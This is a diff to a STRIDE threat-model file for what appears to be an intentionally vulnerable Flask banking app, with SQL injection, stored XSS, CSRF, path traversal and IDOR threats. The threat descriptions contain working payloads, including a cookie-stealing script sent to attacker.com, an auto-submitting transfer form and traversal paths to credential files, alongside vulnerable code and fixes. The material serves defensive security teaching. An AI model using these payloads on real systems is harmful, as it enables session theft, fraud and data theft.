@@ -257,9 +257,9 @@
                   "title": "SQL Injection in Login Form",
                   "status": "Open",
                   "severity": "High",
-                  "type": "Spoofing",
-                  "description": "Provide a description for this threaAttacker can bypass authentication by injecting SQL code into username or password fields. Example payload: admin' OR '1'='1t",
-                  "mitigation": "Use parameterized queries (prepared statements) instead of string concatenation. Implement input validation.",
+                  "type": "Tampering",
+                  "description": "Attacker can bypass authentication by injecting malicious SQL code into username or password fields. The vulnerable code uses string concatenation to build SQL queries, allowing attackers to manipulate the query logic.\n\nExample payload:\nUsername: admin' OR '1'='1\nPassword: anything\n\nVulnerable code:\nquery = f\"SELECT * FROM users WHERE username='{username}' AND password='{password}'\"\n\nAttack scenario:\n1. Attacker enters: admin' OR '1'='1 in username field\n2. SQL query becomes: SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'\n3. Condition '1'='1' is always true, bypassing authentication\n4. Attacker gains unauthorized access to admin account\n5. Attacker can access all user accounts, view balances, transfer funds",
+                  "mitigation": "1. Use parameterized queries (prepared statements) instead of string concatenation\n2. Implement input validation and sanitization\n3. Use ORM (Object-Relational Mapping) frameworks that handle SQL safely\n4. Apply principle of least privilege to database users\n5. Implement rate limiting on login attempts\n6. Log and monitor suspicious SQL patterns\n\nSecure code example:\ndb.execute('SELECT * FROM users WHERE username = ? AND password = ?', (username, password))",
                   "modelType": "STRIDE",
                   "new": false,
                   "number": 1,
@@ -271,8 +271,8 @@
                   "status": "Open",
                   "severity": "High",
                   "type": "Tampering",
-                  "description": "Attacker can inject malicious JavaScript into user profile fields (e.g., bio). The script executes when other users view the profile, potentially stealing session cookies or performing unauthorized actions.\n\nExample payload:\n<script>alert('XSS')</script>\n<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>\n\nAttack scenario:\n1. Attacker creates account\n2. Sets bio to malicious script\n3. Admin views attacker's profile\n4. Script executes, stealing admin session\n5. Attacker uses stolen session to transfer funds",
-                  "mitigation": "Attacker can inject malicious JavaScript into user profile fields (e.g., bio). The script executes when other users view the profile, potentially stealing session cookies or performing unauthorized actions.\n\nExample payload:\n<script>alert('XSS')</script>\n<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>\n\nAttack scenario:\n1. Attacker creates account\n2. Sets bio to malicious script\n3. Admin views attacker's profile\n4. Script executes, stealing admin session\n5. Attacker uses stolen session to transfer funds",
+                  "description": "Attacker can inject malicious JavaScript into user profile fields (e.g., bio). The vulnerable code uses |safe filter in templates, allowing HTML/JavaScript to execute. The script is stored in the database and executes when any user views the profile, potentially stealing session cookies or performing unauthorized actions.\n\nExample payloads:\n<script>alert('XSS Attack!')</script>\n<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>\n<img src=x onerror=\"alert('XSS')\">\n\nVulnerable code:\n{{ g.user['bio']|safe }}\n\nAttack scenario:\n1. Attacker creates account\n2. Sets bio field to malicious script: <script>alert(document.cookie)</script>\n3. Script is stored in database without sanitization\n4. Admin or other users view attacker's profile\n5. Script executes in victim's browser, stealing session cookies\n6. Attacker uses stolen session to access victim's account and transfer funds",
+                  "mitigation": "1. Remove |safe filter from templates - use automatic HTML escaping (Jinja2 default)\n2. Sanitize user input before storing in database using markupsafe.escape()\n3. Implement Content Security Policy (CSP) headers to prevent script execution\n4. Use whitelist-based HTML sanitization if HTML formatting is required\n5. Validate and sanitize all user-supplied data\n6. Implement output encoding based on context (HTML, JavaScript, URL)\n\nSecure code example:\nfrom markupsafe import escape\nbio = escape(bio)  # Escape HTML entities\n# In template: {{ g.user['bio'] }} (no |safe filter)",
                   "modelType": "STRIDE",
                   "new": false,
                   "number": 2,
@@ -283,13 +283,13 @@
                   "title": "CSRF in Money Transfer",
                   "status": "Open",
                   "severity": "High",
-                  "type": "Elevation of privilege",
-                  "description": "Attacker tricks authenticated user into making unauthorized money transfers by visiting a malicious website that automatically submits a hidden form to the banking application.\n\nExample attack:\nMalicious website contains:\n<form id=\"evil\" action=\"http://bankingapp.com/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"to_account\" value=\"attacker123\">\n  <input type=\"hidden\" name=\"amount\" value=\"5000\">\n</form>\n<script>document.getElementById('evil').submit();</script>\n\nAttack scenario:\n1. User logs into banking app (session active)\n2. User visits attacker's website (without logging out)\n3. Hidden form automatically submits\n4. $5000 transferred to attacker's account\n5. User discovers loss later",
-                  "mitigation": "1. Implement CSRF tokens in all state-changing forms (POST, PUT, DELETE)\n2. Use Flask-WTF CSRF protection module\n3. Set SameSite cookie attribute to 'Strict' or 'Lax'\n4. Verify Referer and Origin headers\n5. Use double-submit cookie pattern\n6. Require re-authentication for sensitive operations\n7. Implement transaction confirmation via email/SMS",
+                  "type": "Spoofing",
+                  "description": "Attacker tricks authenticated user into making unauthorized money transfers by visiting a malicious website that automatically submits a hidden form to the banking application. The vulnerable code lacks CSRF token validation, allowing any website to submit requests on behalf of authenticated users.\n\nExample attack:\nMalicious website (csrf_attack.html) contains:\n<form id=\"evil\" action=\"http://bankingapp.com/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"to_account\" value=\"ACC-1004\">\n  <input type=\"hidden\" name=\"amount\" value=\"500\">\n  <input type=\"hidden\" name=\"description\" value=\"Prize claim fee\">\n</form>\n<script>document.getElementById('evil').submit();</script>\n\nVulnerable code:\nNo CSRF token in form, no validation of request origin\n\nAttack scenario:\n1. User logs into banking app at localhost:5000 (session cookie active)\n2. User visits attacker's malicious website at localhost:8000/csrf_attack.html\n3. Malicious page contains hidden form targeting banking app\n4. Form automatically submits when page loads\n5. Browser sends request with user's session cookie (Same-Origin Policy allows)\n6. Banking app processes request without CSRF token validation\n7. $500 transferred to attacker's account (ACC-1004)\n8. User discovers unauthorized transaction later",
+                  "mitigation": "1. Implement CSRF tokens in all state-changing forms (POST, PUT, DELETE)\n2. Use Flask-WTF CSRF protection module (CSRFProtect)\n3. Set SameSite cookie attribute to 'Strict' or 'Lax'\n4. Verify Referer and Origin headers\n5. Use double-submit cookie pattern\n6. Require re-authentication for sensitive operations (money transfers)\n7. Implement transaction confirmation via email/SMS\n\nSecure code example:\nfrom flask_wtf.csrf import CSRFProtect\ncsrf = CSRFProtect(app)\n# In template: <input type=\"hidden\" name=\"csrf_token\" value=\"{{ csrf_token() }}\"/>",
                   "modelType": "STRIDE",
                   "new": false,
                   "number": 3,
-                  "score": ""
+                  "score": "high"
                 },
                 {
                   "id": "d4e0bec6-e17d-4779-8a19-8a437f55819c",
@@ -297,21 +297,34 @@
                   "status": "Open",
                   "severity": "High",
                   "type": "Information disclosure",
-                  "description": "The file download feature does not validate file paths. Attacker can access files outside the intended directory using path traversal sequences (../) to read sensitive files like source code, configuration files, or system files.\n\nExample payloads:\n/download/../../etc/passwd\n/download/../../../../app/db.py\n/download/../../../config/database.yml\n/download/..\\..\\..\\..\\Windows\\System32\\config\\SAM\n\nAttack scenario:\n1. Attacker discovers download endpoint: /download/<filename>\n2. Tests with: /download/../../etc/passwd\n3. Server returns system password file\n4. Attacker tries: /download/../app/db.py\n5. Downloads source code containing database credentials\n6. Uses credentials to directly access database\n7. Exfiltrates all customer financial data",
-                  "mitigation": "1. Validate and sanitize all file paths\n2. Use whitelist of allowed filenames only\n3. Use secure_filename() from werkzeug.utils\n4. Verify absolute paths don't escape intended directory:\n   allowed_dir = os.path.abspath('/statements')\n   requested = os.path.abspath(os.path.join('/statements', filename))\n   if not requested.startswith(allowed_dir): abort(403)\n5. Store files outside web root directory\n6. Implement proper access control checks\n7. Use file IDs instead of filenames in URLs\n8. Log all file access attempts for monitoring",
+                  "description": "The file download feature does not validate file paths. Attacker can access files outside the intended directory using path traversal sequences (../) to read sensitive files like source code, configuration files, or system files.\n\nExample payloads:\n/download?file=../app/schema.sql\n/download?file=../app/auth.py\n/download?file=../app/__init__.py\n/download?file=../../etc/passwd (Linux)\n/download?file=..\\..\\..\\Windows\\System32\\config\\SAM (Windows)\n\nVulnerable code:\nfilename = request.args.get('file', '')\nfilepath = os.path.join(base_dir, filename)  # No validation!\nreturn send_file(filepath, as_attachment=True)\n\nAttack scenario:\n1. Attacker discovers download endpoint: /download?file=<filename>\n2. Tests with: /download?file=../app/schema.sql\n3. Server constructs path: instance/../app/schema.sql = app/schema.sql\n4. Server returns database schema file\n5. Attacker tries: /download?file=../app/auth.py\n6. Downloads source code revealing SQL injection vulnerability\n7. Attacker uses knowledge to craft more sophisticated attacks\n8. Accesses configuration files with database credentials\n9. Directly connects to database and exfiltrates all customer financial data",
+                  "mitigation": "1. Validate and sanitize all file paths using os.path.basename()\n2. Use whitelist of allowed filenames only\n3. Use secure_filename() from werkzeug.utils\n4. Verify absolute paths don't escape intended directory:\n   allowed_dir = os.path.abspath('/statements')\n   requested = os.path.abspath(os.path.join('/statements', filename))\n   if not requested.startswith(allowed_dir): abort(403)\n5. Store files outside web root directory\n6. Implement proper access control checks (user can only access their own files)\n7. Use file IDs instead of filenames in URLs\n8. Log all file access attempts for monitoring\n\nSecure code example:\nfilename = os.path.basename(request.args.get('file', ''))\nfilepath = os.path.abspath(os.path.join(statements_dir, filename))\nif not filepath.startswith(os.path.abspath(statements_dir)):\n    abort(403)",
                   "modelType": "STRIDE",
                   "new": false,
                   "number": 4,
+                  "score": "high"
+                },
+                {
+                  "id": "a8f2c9d1-4e5b-6c7d-8e9f-0a1b2c3d4e5f",
+                  "title": "IDOR in Account Details",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Information disclosure",
+                  "description": "The account details endpoint does not verify that the requested account belongs to the logged-in user. Attacker can access any user's account information by simply changing the account_id parameter in the URL, violating the principle of least privilege and account isolation.\n\nExample attack:\nLogged in as admin (account_id=1), attacker changes URL:\n/account/1 → Own account (legitimate)\n/account/2 → Alice's account (unauthorized access!)\n/account/3 → Bob's account (unauthorized access!)\n\nVulnerable code:\n@app.route('/account/<int:account_id>')\ndef account_details(account_id):\n    account = db.execute('SELECT * FROM accounts WHERE id = ?', (account_id,)).fetchone()\n    # No authorization check!\n    return render_template('account_details.html', account=account)\n\nAttack scenario:\n1. Attacker logs in as admin (user_id=1, account_id=1)\n2. Views own account: /account/1 (normal behavior)\n3. Manually changes URL to: /account/2 (Alice's account)\n4. System fetches account without checking ownership\n5. Attacker views Alice's account balance: $5,000\n6. Attacker views Alice's transaction history\n7. Attacker views Alice's personal information (email, full name)\n8. Attacker can enumerate all accounts by trying /account/3, /account/4, etc.\n9. Attacker builds complete database of all customers and their balances",
+                  "mitigation": "1. Implement authorization check before displaying account data\n2. Verify account belongs to logged-in user: account['user_id'] == g.user['id']\n3. Return 403 Forbidden if authorization fails\n4. Use indirect object references (tokens/IDs) instead of direct database IDs\n5. Implement role-based access control (RBAC)\n6. Log all unauthorized access attempts\n7. Use account numbers instead of sequential IDs in URLs\n\nSecure code example:\naccount = db.execute('SELECT * FROM accounts WHERE id = ?', (account_id,)).fetchone()\nif account['user_id'] != g.user['id']:\n    flash('Access denied: You can only view your own account', 'error')\n    return redirect(url_for('dashboard'))",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 5,
                   "score": "high"
                 }
               ],
               "threatFrequency": {
                 "spoofing": 1,
-                "tampering": 1,
+                "tampering": 2,
                 "repudiation": 0,
-                "informationDisclosure": 1,
+                "informationDisclosure": 2,
                 "denialOfService": 0,
-                "elevationOfPrivilege": 2
+                "elevationOfPrivilege": 0
               }
             }
           },
@@ -691,6 +704,6 @@
     ],
     "diagramTop": 1,
     "reviewer": "",
-    "threatTop": 4
+    "threatTop": 5
   }
 }
